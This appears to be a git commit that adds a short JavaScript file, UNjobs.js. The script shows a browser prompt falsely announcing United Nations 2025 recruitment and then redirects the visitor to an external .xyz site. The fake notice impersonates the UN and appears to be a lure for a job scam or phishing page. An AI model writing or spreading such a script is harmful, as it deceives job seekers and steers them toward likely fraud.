f1d388653e74bcf6a4db1e8595e88b24eacdbac6
bigetijazz32 <bigetijazz32@gmail.com>
2025-08-18 10:31:22 +0100

    Create UNjobs.js

---
+++ UNjobs.js
@@ -0,0 +1,6 @@
+
+var password = 'UN Recruitment'
+password=prompt('NOTICE: United Nation (UN) 2025 is currently recruiting, press OK to apply for the','UN Recruitment');
+if (password != 'UN Recruitment') {
+location.href='https://www.udwang.xyz/United-Nations-Jobs';
+}
